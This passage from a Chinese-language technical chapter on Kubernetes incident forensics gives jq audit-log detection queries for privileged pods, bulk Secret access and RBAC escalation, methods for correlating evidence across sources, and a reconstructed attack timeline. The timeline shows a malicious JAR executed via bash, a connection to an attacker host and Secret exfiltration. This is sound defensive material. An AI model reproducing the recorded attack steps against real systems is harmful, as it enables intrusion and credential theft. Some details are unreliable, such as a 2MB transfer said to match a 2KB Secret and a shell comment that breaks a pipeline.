│   responseStatus.code: 403 (Forbidden)                      │
│   annotations["authorization.k8s.io/decision"]: "deny"      │
│                                                              │
│ 取证价值:                                                    │
│   • 识别攻击者的探测行为                                      │
│   • 发现过度权限请求 (尝试访问不该访问的资源)                 │
│   • 时间模式分析 (批量尝试 → 自动化工具)                      │
│                                                              │
│ jq 查询:                                                     │
│ jq 'select(.responseStatus.code == 403) |                   │
│     {time: .requestReceivedTimestamp,                        │
│      user: .user.username,                                   │
│      resource: .objectRef.resource,                          │
│      name: .objectRef.name}'                                 │
├──────────────────────────────────────────────────────────────┤
│ 模式 2: 特权 Pod 创建                                         │
│ ─────────────────────────────────────────────────────────── │
│ 特征:                                                        │
│   verb: create                                              │
│   objectRef.resource: pods                                  │
│   requestObject.spec.hostNetwork: true                      │
│   或 requestObject.spec.hostPID: true                        │
│   或 requestObject.spec.containers[].securityContext.       │
│       privileged: true                                       │
│                                                              │
│ 取证价值:                                                    │
│   • 容器逃逸的前置条件                                        │
│   • 可能的恶意 Pod 部署                                       │
│   • 需要与 NetworkPolicy/PSP 日志关联                        │
│                                                              │
│ jq 查询:                                                     │
│ jq 'select(.verb == "create" and                            │
│            .objectRef.resource == "pods" and                 │
│            (.requestObject.spec.hostNetwork == true or       │
│             .requestObject.spec.hostPID == true or           │
│             any(.requestObject.spec.containers[];            │
│                 .securityContext.privileged == true)))'      │
├──────────────────────────────────────────────────────────────┤
│ 模式 3: Secret 批量访问                                       │
│ ─────────────────────────────────────────────────────────── │
│ 特征:                                                        │
│   objectRef.resource: secrets                               │
│   verb: get/list                                            │
│   同一用户在短时间内访问多个 Secret                           │
│                                                              │
│ 取证价值:                                                    │
│   • 凭据窃取行为                                              │
│   • 横向移动准备                                              │
│   • 需要关联网络日志 (数据泄露确认)                           │
│                                                              │
│ jq 查询:                                                     │
│ jq -s 'group_by(.user.username) |                           │
│        map(select(.[0].objectRef.resource == "secrets") |    │
│            {user: .[0].user.username,                        │
│             count: length,                                   │
│             secrets: map(.objectRef.name)}) |                │
│        select(.count > 5)'                                   │
├──────────────────────────────────────────────────────────────┤
│ 模式 4: RBAC 权限升级                                         │
│ ─────────────────────────────────────────────────────────── │
│ 特征:                                                        │
│   verb: create/update/patch                                 │
│   objectRef.resource: roles/rolebindings/                   │
│                       clusterroles/clusterrolebindings       │
│   requestObject.rules: 包含敏感权限                           │
│     (如 ["*"] verbs 或 ["secrets"] resources)                │
│                                                              │
│ 取证价值:                                                    │
│   • 权限提升攻击                                              │
│   • 后门账号创建                                              │
│   • 需要分析权限变更前后的差异                                │
│                                                              │
│ jq 查询:                                                     │
│ jq 'select(.objectRef.resource |                            │
│            test("role|rolebinding")) |                       │
│     select(.verb | test("create|update|patch"))'            │
├──────────────────────────────────────────────────────────────┤
│ 模式 5: Pod Exec/PortForward                                 │
│ ─────────────────────────────────────────────────────────── │
│ 特征:                                                        │
│   objectRef.subresource: "exec" 或 "portforward"            │
│   verb: create                                              │
│                                                              │
│ 取证价值:                                                    │
│   • 交互式访问容器                                            │
│   • 潜在的命令执行                                            │
│   • 需要关联 eBPF 数据 (实际执行的命令)                       │
│                                                              │
│ jq 查询:                                                     │
│ jq 'select(.objectRef.subresource |                         │
│            test("exec|portforward|attach"))'                 │
└──────────────────────────────────────────────────────────────┘
```

### 2.7.3 审计后端选项

```
Kubernetes 审计后端对比:

┌─────────────┬────────────────────────────────────────────────┐
│ 后端类型    │ 特点与适用场景                                  │
├─────────────┼────────────────────────────────────────────────┤
│ Log 文件    │ • 配置: --audit-log-path=/var/log/audit.log   │
│             │ • 优点: 简单,无外部依赖                        │
│             │ • 缺点: 需要日志轮转,难以集中化分析            │
│             │ • 适用: 小规模集群,测试环境                    │
│             │                                                │
│             │ 配置示例:                                      │
│             │   --audit-log-path=/var/log/kubernetes/audit.log│
│             │   --audit-log-maxage=30  # 保留天数           │
│             │   --audit-log-maxbackup=10  # 备份文件数      │
│             │   --audit-log-maxsize=100  # 文件大小 MB      │
├─────────────┼────────────────────────────────────────────────┤
│ Webhook     │ • 配置: --audit-webhook-config-file           │
│             │ • 优点: 实时发送到外部系统                     │
│             │ • 缺点: 外部系统不可用时可能丢失事件            │
│             │ • 适用: 集成 SIEM/日志平台                     │
│             │                                                │
│             │ 配置示例:                                      │
│             │   # webhook-config.yaml                        │
│             │   apiVersion: v1                               │
│             │   kind: Config                                 │
│             │   clusters:                                    │
│             │   - name: audit-webhook                        │
│             │     cluster:                                   │
│             │       server: https://audit-collector:9090     │
│             │       certificate-authority: /etc/ca.crt       │
│             │   users:                                       │
│             │   - name: audit-webhook-user                   │
│             │     user:                                      │
│             │       client-certificate: /etc/client.crt      │
│             │       client-key: /etc/client.key              │
├─────────────┼────────────────────────────────────────────────┤
│ Dynamic     │ • 配置: AuditSink CRD (Kubernetes 1.19+)      │
│  (AuditSink)│ • 优点: 动态配置,无需重启 API Server          │
│             │ • 缺点: 实验性功能,生产环境需谨慎             │
│             │ • 适用: 云原生审计平台                         │
│             │                                                │
│             │ 配置示例:                                      │
│             │   apiVersion: auditregistration.k8s.io/v1alpha1│
│             │   kind: AuditSink                              │
│             │   metadata:                                    │
│             │     name: forensics-auditsink                  │
│             │   spec:                                        │
│             │     policy:                                    │
│             │       level: RequestResponse                   │
│             │     webhook:                                   │
│             │       throttle:                                │
│             │         qps: 100                               │
│             │         burst: 200                             │
│             │       clientConfig:                            │
│             │         url: "https://audit.forensics.svc:443" │
└─────────────┴────────────────────────────────────────────────┘
```

### 2.7.4 审计日志分析模式

```bash
# 取证场景分析脚本

# 1. 统计各用户的 API 操作频率 (识别异常活跃账户)
cat audit.log | jq -r '.user.username' | sort | uniq -c | sort -rn | head -20

# 2. 查找所有失败的权限检查 (潜在攻击探测)
cat audit.log | jq 'select(.responseStatus.code == 403)' > unauthorized_attempts.json

# 3. 追踪特定 Pod 的完整生命周期
POD_UID="a1b2c3d4-e5f6-7890-abcd-ef1234567890"
cat audit.log | jq --arg uid "$POD_UID" \
  'select(.objectRef.uid == $uid or 
          .user.extra["authentication.kubernetes.io/pod-uid"][]? == $uid) | 
   {time: .requestReceivedTimestamp, verb: .verb, resource: .objectRef.resource}'

# 4. 检测 Secret 访问峰值 (数据泄露指标)
cat audit.log | jq -r \
  'select(.objectRef.resource == "secrets" and .verb == "get") | 
   .requestReceivedTimestamp' | \
  awk '{print substr($0, 1, 16)}' | \  # 按分钟分组
  sort | uniq -c | sort -rn | head -10

# 5. 分析 RBAC 变更历史
cat audit.log | jq \
  'select(.objectRef.resource | test("role|binding")) | 
   {time: .requestReceivedTimestamp, 
    user: .user.username, 
    verb: .verb, 
    name: .objectRef.name, 
    namespace: .objectRef.namespace}'

# 6. 检测可疑的 User-Agent (自动化工具/脚本)
cat audit.log | jq -r '.userAgent' | sort | uniq -c | sort -rn

# 7. 时间序列分析 (每小时事件数)
cat audit.log | jq -r '.requestReceivedTimestamp' | \
  cut -c1-13 | sort | uniq -c | \
  awk '{print $2":00:00 " $1}' > events_per_hour.csv

# 8. 关联分析: Pod 创建后的 Secret 访问
cat audit.log | jq -s \
  'group_by(.user.username) | 
   map({user: .[0].user.username, 
        pod_creates: map(select(.verb == "create" and 
                                .objectRef.resource == "pods")), 
        secret_gets: map(select(.verb == "get" and 
                                .objectRef.resource == "secrets"))}) | 
   map(select(.pod_creates | length > 0 and 
              .secret_gets | length > 0))'
```

---

## 2.8 证据关联与多源融合

### 2.8.1 多源证据融合挑战

```
Kubernetes 环境中的证据碎片化问题:

事件: "Pod 异常终止"

证据分散在:
┌──────────────────────────────────────────────────────────────┐
│ 数据源 1: API Server 审计日志                                 │
│   → Pod 被 delete 的操作记录                                  │
│   → 但不知道"为什么"被删除                                    │
├──────────────────────────────────────────────────────────────┤
│ 数据源 2: Kubelet 日志                                        │
│   → OOMKilled 事件                                           │
│   → 但不知道是哪个进程导致 OOM                                │
├──────────────────────────────────────────────────────────────┤
│ 数据源 3: Prometheus 指标                                     │
│   → 内存使用率在终止前 5 分钟内从 60% 飙升至 95%              │
│   → 但不知道哪个容器/进程消耗内存                             │
├──────────────────────────────────────────────────────────────┤
│ 数据源 4: 应用日志                                            │
│   → ERROR: java.lang.OutOfMemoryError: Java heap space       │
│   → 指出了具体错误,但不知道上下文                             │
├──────────────────────────────────────────────────────────────┤
│ 数据源 5: eBPF 事件 (Falco)                                   │
│   → 检测到异常内存分配行为                                    │
│   → 包含进程 PID 和系统调用序列                               │
└──────────────────────────────────────────────────────────────┘

融合后的完整叙事:
┌──────────────────────────────────────────────────────────────┐
│ Timeline:                                                    │
│ ──────────────────────────────────────────────────────────── │
│ T-5min [Prometheus] 内存使用率开始上升                        │
│ T-2min [eBPF] 进程 PID 1234 执行大量 mmap() 调用             │
│ T-1min [App Log] OutOfMemoryError 异常                       │
│ T-0    [Kubelet] OOMKilled, 容器退出码 137                   │
│ T+5s   [API Server] Pod 状态更新为 Failed                    │
│ T+10s  [API Server] Deployment Controller 创建新 Pod         │
│                                                              │
│ Root Cause:                                                  │
│   应用代码中的内存泄漏 (mmap 未释放) 导致 OOM               │
│                                                              │
│ Evidence Chain:                                              │
│   指标 (趋势) → eBPF (具体行为) → 日志 (错误确认)            │
│   → 审计 (状态变更) → 完整因果链                             │
└──────────────────────────────────────────────────────────────┘
```

### 2.8.2 关联技术分类

```
证据关联方法论:

方法 1: 基于标识符的关联 (Identifier-Based Correlation)
─────────────────────────────────────────────────────────────
强关联: 通过唯一标识符直接关联
  • Pod UID: 关联审计日志 + kubelet 日志 + 指标 + eBPF 事件
  • Trace ID: 关联分布式追踪 + 应用日志 + 网络日志
  • Audit ID: 关联 API Server 审计事件的多个 stage
  • Container ID: 关联 CRI 日志 + cgroup 指标 + eBPF 事件

实现:
  # Elasticsearch 查询
  GET /logs-*/_search
  {
    "query": {
      "bool": {
        "should": [
          {"term": {"k8s.pod.uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"}},
          {"term": {"kubernetes.pod_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"}},
          {"term": {"pod_uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"}}
        ]
      }
    }
  }

方法 2: 基于时间窗口的关联 (Time-Window Correlation)
─────────────────────────────────────────────────────────────
弱关联: 通过时间邻近性推断关联
  • 时间窗口: ±30 秒 (可配置)
  • 前提: 时钟同步 (NTP)
  • 适用: 无共同标识符的跨系统事件

实现:
  # 查找 OOMKilled 前后 30 秒的所有事件
  TIME_CENTER="2026-02-25T10:28:50Z"
  cat audit.log | jq --arg time "$TIME_CENTER" \
    'select((.requestReceivedTimestamp >= 
             ($time | fromdateiso8601 - 30) | todateiso8601) and
            (.requestReceivedTimestamp <= 
             ($time | fromdateiso8601 + 30) | todateiso8601))'

方法 3: 基于模式相似性的关联 (Pattern Similarity Correlation)
─────────────────────────────────────────────────────────────
启发式关联: 通过模式匹配推断关联
  • CPU 峰值与错误日志同时出现
  • 网络延迟增加与 DNS 查询失败时间对齐
  • Pod 重启与节点资源耗尽模式匹配

实现:
  # Prometheus PromQL: 内存峰值与 OOMKill 关联
  (rate(container_memory_usage_bytes[5m]) > 0.9 * 
   container_spec_memory_limit_bytes) and on(pod) 
  (kube_pod_container_status_restarts_total > 0)

方法 4: 基于因果推理的关联 (Causal Inference Correlation)
─────────────────────────────────────────────────────────────
因果关联: 基于已知的因果关系模型
  • Deployment 更新 → ReplicaSet 创建 → Pod 创建
  • NetworkPolicy 变更 → 连接失败 → 应用错误
  • Secret 更新 → Pod 重启 (如果挂载了 Secret)

实现:
  # 构建因果图
  Deployment Update (T0)
    → ReplicaSet Created (T0 + 1s)
      → Old Pods Terminated (T0 + 2s)
      → New Pods Created (T0 + 2s)
        → Containers Started (T0 + 5s)
          → Application Ready (T0 + 15s)
  
  # 验证: 每个阶段的时间差是否符合预期
```

### 2.8.3 知识图谱方法

```
证据知识图谱构建:

概念:
  将证据表示为图结构,节点是实体,边是关系

示例:
┌──────────────────────────────────────────────────────────────┐
│ 证据实体类型 (Nodes):                                         │
│ ──────────────────────────────────────────────────────────── │
│ • Pod                                                        │
│ • Container                                                  │
│ • Node                                                       │
│ • ServiceAccount                                             │
│ • Secret                                                     │
│ • NetworkPolicy                                              │
│ • Event (API 事件)                                            │
│ • LogEntry (日志条目)                                         │
│ • MetricDatapoint (指标数据点)                               │
│ • NetworkFlow (网络流)                                        │
│ • Process (进程)                                              │
│ • File (文件)                                                 │
├──────────────────────────────────────────────────────────────┤
│ 关系类型 (Edges):                                             │
│ ──────────────────────────────────────────────────────────── │
│ • CREATED_BY (Pod → ServiceAccount)                          │
│ • RUNS_ON (Pod → Node)                                       │
│ • ACCESSED (ServiceAccount → Secret)                         │
│ • LOGS_TO (Container → LogEntry)                             │
│ • CONNECTS_TO (Pod → Pod)                                    │
│ • ALLOWED_BY (NetworkFlow → NetworkPolicy)                   │
│ • SPAWNED (Process → Process)                                │
│ • EXECUTED_IN (Process → Container)                          │
│ • CAUSED (Event → Event)                                     │
└──────────────────────────────────────────────────────────────┘

Neo4j Cypher 查询示例:
// 查找所有访问 Secret 的路径
MATCH path = (sa:ServiceAccount)-[:CREATED]->(p:Pod)
             -[:CONTAINS]->(c:Container)
             -[:EXECUTED]->(proc:Process)
             -[:ACCESSED]->(s:Secret {name: "db-credentials"})
RETURN path

// 查找攻击传播路径
MATCH path = (entry:Pod {label: "internet-facing"})
             -[:CONNECTED_TO*1..5]->(target:Pod)
WHERE target.namespace = "production"
RETURN path

// 识别关键节点 (PageRank)
CALL gds.pageRank.stream('evidence-graph')
YIELD nodeId, score
RETURN gds.util.asNode(nodeId).name AS entity, score
ORDER BY score DESC
LIMIT 10
```

### 2.8.4 自动化关联工作流

```yaml
# Argo Workflow: 自动化证据关联分析
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  name: evidence-correlation-workflow
spec:
  entrypoint: correlation-analysis
  arguments:
    parameters:
    - name: incident-id
      value: "INC-20260225-001"
    - name: incident-time
      value: "2026-02-25T10:28:50Z"
    - name: time-window-seconds
      value: "300"  # ±5 分钟
  
  templates:
  - name: correlation-analysis
    steps:
    - - name: collect-evidence-sources
        template: gather-evidence
    - - name: identifier-correlation
        template: correlate-by-identifier
      - name: time-correlation
        template: correlate-by-time
    - - name: build-knowledge-graph
        template: create-graph
    - - name: generate-timeline
        template: generate-timeline
    - - name: generate-report
        template: create-report
  
  - name: gather-evidence
    script:
      image: python:3.11
      command: [python]
      source: |
        import json
        from datetime import datetime, timedelta
        
        incident_time = datetime.fromisoformat("{{workflow.parameters.incident-time}}")
        window = timedelta(seconds={{workflow.parameters.time-window-seconds}})
        
        # 1. 查询 API Server 审计日志
        audit_events = query_elasticsearch(
            index="k8s-audit-*",
            time_range=(incident_time - window, incident_time + window)
        )
        
        # 2. 查询应用日志
        app_logs = query_loki(
            query='{namespace="production"}',
            time_range=(incident_time - window, incident_time + window)
        )
        
        # 3. 查询指标数据
        metrics = query_prometheus(
            query='container_memory_usage_bytes{namespace="production"}',
            time_range=(incident_time - window, incident_time + window)
        )
        
        # 4. 查询 eBPF 事件
        ebpf_events = query_falco_db(
            time_range=(incident_time - window, incident_time + window)
        )
        
        # 5. 查询网络流
        network_flows = query_hubble(
            time_range=(incident_time - window, incident_time + window)
        )
        
        # 保存原始证据
        with open('/mnt/evidence/raw_evidence.json', 'w') as f:
            json.dump({
                'audit': audit_events,
                'logs': app_logs,
                'metrics': metrics,
                'ebpf': ebpf_events,
                'network': network_flows
            }, f)
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: correlate-by-identifier
    script:
      image: python:3.11
      command: [python]
      source: |
        import json
        from collections import defaultdict
        
        # 加载原始证据
        with open('/mnt/evidence/raw_evidence.json') as f:
            evidence = json.load(f)
        
        # 提取所有关联标识符
        correlations = defaultdict(lambda: {
            'audit': [],
            'logs': [],
            'metrics': [],
            'ebpf': [],
            'network': []
        })
        
        # 按 Pod UID 关联
        for event in evidence['audit']:
            pod_uid = event.get('objectRef', {}).get('uid')
            if pod_uid:
                correlations[pod_uid]['audit'].append(event)
        
        for log in evidence['logs']:
            pod_uid = log.get('kubernetes', {}).get('pod_uid')
            if pod_uid:
                correlations[pod_uid]['logs'].append(log)
        
        # 按 Trace ID 关联
        for log in evidence['logs']:
            trace_id = log.get('trace_id')
            if trace_id:
                correlations[f"trace-{trace_id}"]['logs'].append(log)
        
        # 保存关联结果
        with open('/mnt/evidence/identifier_correlations.json', 'w') as f:
            json.dump(dict(correlations), f)
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: create-graph
    script:
      image: neo4j:5
      command: [python]
      source: |
        from neo4j import GraphDatabase
        import json
        
        driver = GraphDatabase.driver("bolt://neo4j:7687")
        
        with open('/mnt/evidence/identifier_correlations.json') as f:
            correlations = json.load(f)
        
        with driver.session() as session:
            # 创建实体节点
            for pod_uid, evidence in correlations.items():
                # 创建 Pod 节点
                session.run(
                    "MERGE (p:Pod {uid: $uid})",
                    uid=pod_uid
                )
                
                # 创建证据节点和关系
                for audit_event in evidence['audit']:
                    session.run("""
                        MATCH (p:Pod {uid: $pod_uid})
                        MERGE (e:AuditEvent {id: $audit_id})
                        SET e.verb = $verb, e.resource = $resource
                        MERGE (p)-[:GENERATED]->(e)
                    """,
                        pod_uid=pod_uid,
                        audit_id=audit_event['auditID'],
                        verb=audit_event['verb'],
                        resource=audit_event['objectRef']['resource']
                    )
        
        driver.close()
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
  
  - name: generate-timeline
    container:
      image: timesketch/timesketch:latest
      command: ["/usr/local/bin/timesketch_importer"]
      args:
        - "--timeline_name"
        - "{{workflow.parameters.incident-id}}"
        - "/mnt/evidence/raw_evidence.json"
      volumeMounts:
      - name: evidence-storage
        mountPath: /mnt/evidence
```

### 2.8.5 实战案例: 完整攻击链重建

```
综合案例: 从单一告警到完整攻击链的证据关联

初始告警:
  [Falco] 10:28:50 - Suspicious outbound connection detected
  Pod: web-app-7d9f8b-xyz
  Destination: 185.71.67.84:4444

Step 1: 标识符关联 (Pod UID)
─────────────────────────────────────────────────────────────
Pod UID: a1b2c3d4-e5f6-7890-abcd-ef1234567890

关联结果:
  • API Server 审计: 123 events
  • Kubelet 日志: 45 entries
  • 应用日志: 3,456 lines
  • eBPF 事件: 89 events
  • Prometheus 指标: 15,000 datapoints
  • Cilium Hubble 流: 234 flows

Step 2: 时间线重建
─────────────────────────────────────────────────────────────
T-30min [10:00:00] API Server: Pod Created
T-29min [10:01:15] Kubelet: Container Started
T-28min [10:02:00] App Log: Application Ready
... (正常运行)
T-15min [10:13:45] Hubble: HTTP POST /api/upload from 203.0.113.42
T-14min [10:14:00] App Log: File uploaded: malicious.jar
T-10min [10:18:30] eBPF: execve("/bin/bash", ["-c", "java -jar /tmp/malicious.jar"])
T-5min  [10:23:15] eBPF: socket(AF_INET), connect(185.71.67.84:4444)
T-0     [10:28:50] Falco: ALERT - Suspicious outbound connection
T+2min  [10:30:15] API Server: Secret "db-credentials" accessed by web-app-sa
T+5min  [10:33:00] Hubble: Large data transfer to 185.71.67.84 (2MB)

Step 3: 因果推理
─────────────────────────────────────────────────────────────
文件上传 → 恶意代码执行 → 网络连接建立 → Secret 窃取 → 数据泄露

验证因果关系:
  ✓ 文件上传时间与执行时间差 4分30秒 (合理延迟)
  ✓ execve 和 socket 调用来自同一进程 (PID 1234)
  ✓ Secret 访问的 ServiceAccount 与 Pod 一致
  ✓ 数据传输大小与 Secret 内容匹配 (约 2KB)

Step 4: 知识图谱可视化
─────────────────────────────────────────────────────────────
(Attacker 203.0.113.42)
         │
         ├──[HTTP POST /api/upload]──►(web-app Pod)
         │                                │
         │                                ├──[execve]──►(bash Process)
         │                                │              │
         │                                │              ├──[java -jar]──►(Java Process)
         │                                │                                │
         │◄───[C2 Connection]─────────────┤◄───[socket/connect]───────────┘
         │                                │
         │                                ├──[API Request]──►(Kubernetes API)
         │                                │                   │
         │                                │                   ├──[get Secret]──►(Secret)
         │                                │                                      │
         │◄───[Data Exfil 2MB]────────────┤◄──────────────────────────────────┘

Step 5: 证据完整性评估
─────────────────────────────────────────────────────────────
证据强度评分:
  ✓ 文件上传: 直接证据 (HTTP 日志 + 文件 hash) - 强
  ✓ 代码执行: 直接证据 (eBPF syscall trace) - 强
  ✓ 网络连接: 直接证据 (Cilium Hubble + conntrack) - 强
  ✓ Secret 访问: 直接证据 (API Server 审计 RequestResponse) - 强
  ✓ 数据泄露: 间接证据 (网络流量大小匹配) - 中

证据链完整性: 100%
  • 无时间缺口
  • 所有关键事件有多源验证
  • 因果关系清晰

可辩护性评估:
  ✓ 所有证据符合 Chain of Custody 要求
  ✓ 时间戳一致性验证通过 (NTP 同步)
  ✓ 证据来源工具均经过验证 (Falco/Cilium/Kubernetes)
  ✓ 可用于合规审计和法律程序

最终结论:
  • 攻击向量: 文件上传 RCE 漏洞
  • 攻击者: 203.0.113.42 (需进一步威胁情报查询)
  • 影响范围: 单个 Pod, 1 个 Secret 泄露
  • 横向移动: 未检测到 (已被NetworkPolicy阻断)
  • 持久化: 未检测到 (容器已隔离并重建)
```

---

## 结语

本章详细阐述了 FEBM 的技术实现体系,涵盖证据生命周期管理、容器检查点、eBPF 遥测、内存取证、时间线重建、网络取证、审计日志分析和多源证据关联八大核心技术领域。这些技术共同构成了云原生环境下系统化取证的完整工具箱。

在下一章中,我们将探讨 FEBM 的最佳实践,包括组织架构设计、自动化流程、团队能力建设和真实世界的案例研究。

---

> **导航**: [<< 上一章 - FEBM 方法论原理与理论基础](./01-febm-theory-foundations.md) | [下一章 - FEBM 最佳实践 >>](./03-febm-best-practices.md)